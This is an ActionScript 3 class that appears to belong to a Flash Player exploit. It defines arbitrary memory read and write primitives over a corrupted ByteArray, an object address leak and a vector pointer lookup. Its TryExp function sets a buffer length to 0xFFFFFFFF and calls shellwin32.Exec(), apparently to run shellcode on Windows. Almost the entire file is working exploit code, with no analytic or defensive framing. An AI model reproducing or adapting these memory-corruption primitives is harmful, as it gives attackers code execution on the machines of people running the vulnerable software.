package
{
	public dynamic class exter32 extends externalizable
	{
		
		static var loc_voff:uint;
		static var loc_38:uint;
		static var loc_39:uint;
		static var vOffs:uint;
		
		//read thing from addr
		static function Get(arg1:uint):uint
		{
			trace("int get");
			if((arg1 < 0x1000) || (arg1 >= 0xC0000000))
			{
				Throw("Get(" + Hex(arg1) + ")");
			}
			infiniteBy.position = arg1;
			return infiniteBy.readUnsignedInt();
		}
		
		//write to addr
		static function Set(arg1:uint,arg2:uint)
		{
			if((arg1 < 0x1000) || (arg1 >= 0xC0000000))
			{
				Throw("Set(" + Hex(arg1) + ")");
			}
			infiniteBy.position = arg1;
			infiniteBy.writeUnsignedInt(arg2);
		}
		
		//get object addr
		static function GetAddr(arg1:Object):uint
		{
			infiniteBy.a4 = arg1;
			infiniteBy.a5 = arg1;
			infiniteBy.a6 = arg1;
			return Get(trige["bufAddr"] + 40)-1;
		}
		
		//get content pointer in vector
		 static function GetAddrV0(arg1:Object):uint
        {
            var a:uint = GetAddr(arg1);
			trace("vector is:0x" + a.toString(16));
			a += verflag ? 0x1c :0x18;
			if(Get(a) < 0x10000)
			{
				a -= 4;
			}
			trace("a+ is:0x" + a.toString(16));
			return Get(a) + 8;
        }
		
		
			
		static function TryExp(arg1:Object)
		{
			infiniteBy.a0 = 0;
			infiniteBy.a1 = 0xFFFFFFFF;
			loc_38 = trige["bufAddr"] - 68;
			shellwin32.Exec();
			
		}
		
	}
}